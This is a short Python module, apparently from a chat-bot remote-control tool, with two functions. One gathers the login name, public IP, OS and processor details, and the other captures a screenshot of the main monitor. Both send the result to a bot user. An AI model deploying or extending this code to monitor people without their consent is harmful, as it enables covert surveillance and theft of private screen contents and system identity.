import os, requests, platform
import mss
import mss.tools


def pc_info(message, user_id, bot):
    username = os.getlogin()
    r = requests.get('https://ip.42.pl/raw')
    user_ip = r.text
    system_name = platform.platform()
    processor = platform.processor()
    os_version = platform.version()
    bot.send_message(user_id,
                     "Name: " + username
                     + "\nIP: " + user_ip
                     + "\nOS: " + system_name
                     + "\nProcessor: " + processor
                     + "\nOS version: " + os_version)


def get_screenshot(message, user_id, bot):
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Use the 1st monitor
        im = sct.grab(monitor)  # Grab the picture
        raw_screenshot = mss.tools.to_png(im.rgb, im.size)
        bot.send_photo(user_id, raw_screenshot)
